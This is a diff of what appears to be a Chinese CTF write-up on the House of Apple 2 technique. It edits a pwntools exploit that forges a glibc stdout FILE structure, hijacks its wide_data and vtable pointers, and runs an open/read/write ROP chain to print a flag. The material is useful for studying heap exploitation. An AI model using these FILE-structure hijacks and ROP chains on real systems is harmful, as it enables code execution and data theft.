@@ -43,15 +43,18 @@ tags: houseof
 最终实现ORW读flag
 
 # exp
+复现的时候搞了一个简单的[filep.py](https://github.com/dbgbgtf1/useful-stuff/blob/main/houseofapple2/filep.py)用来方便取IO结构体成员偏移
 ```python
 from pwn import *
 from filep import Filep
 
-context.log_level = 'debug'
-context.arch = 'amd64'
+context(
+    terminal=['kitty'],
+    os='linux',
+    arch='amd64',
+    log_level='debug',
+)
 libc = ELF('./libc.so.6')
-
-io = remote('0.0.0.0', 70)
 
 io.sendafter(b'token: ', b'a' * 0x28)
 io.recvuntil(b'a' * 0x28)
@@ -64,7 +67,7 @@ stderr = Filep(libc.address + 0x2044E0)
 
 io.sendlineafter(b'Choice', b'1')
 pause()
-io.sendlineafter(b'Size', (str(stdin._IO_buf_base['address'] + 1)).encode())
+io.sendlineafter(b'Size', (str(stdin._IO_buf_base.address + 1)).encode())
 pause()
 io.sendafter(b'Content', b'a')
 
@@ -109,8 +112,8 @@ fake_stdout = flat(
         0x58: p64(rsi),
         0x60: p64(stdout.address + 0x70),
         0x68: p64(syscall),
-        stdout._wide_data['offset']: p64(stderr.address - 0x10),
-        stdout.vtable['offset']: p64(io_wfile_jumps + 0x10),
+        stdout._wide_data.offset : p64(stderr.address - 0x10),
+        stdout.vtable.offset: p64(io_wfile_jumps + 0x10),
     },
     filler=b'\x00',
 )
@@ -123,58 +126,26 @@ flag_addr = stdout.address + 0x20
 
 pause()
 rop = flat(
-    rdi,
-    -100,
-    rsi,
-    flag_addr,
-    rdx,
-    0x0,
-    0x0,
-    0x0,
-    0x0,
-    0x0,
-    rax,
-    0x101,
-    rcx,
-    0x0,
+    rdi, -100,
+    rsi, flag_addr,
+    rdx, 0x0, 0x0, 0x0, 0x0, 0x0,
+    rax, 0x101,
+    rcx, 0x0,
     syscall,
 
-    rdi,
-    0x3,
-    rsi,
-    flag_addr,
-    rdx,
-    0x100,
-    0x0,
-    0x0,
-    0x0,
-    0x0,
-    rax,
-    0x0,
+    rdi, 0x3,
+    rsi, flag_addr,
+    rdx, 0x100, 0x0, 0x0, 0x0, 0x0,
+    rax, 0x0,
     syscall,
 
-    rdi,
-    0x1,
-    rsi,
-    flag_addr,
-    rdx,
-    0x100,
-    0x0,
-    0x0,
-    0x0,
-    0x0,
-    rax,
-    0x1,
+    rdi, 0x1,
+    rsi, flag_addr,
+    rdx, 0x100, 0x0, 0x0, 0x0, 0x0,
+    rax, 0x1,
     syscall,
 )
 io.send(rop)
 
 io.interactive()
-
 ```
-
-
-
-
-
-
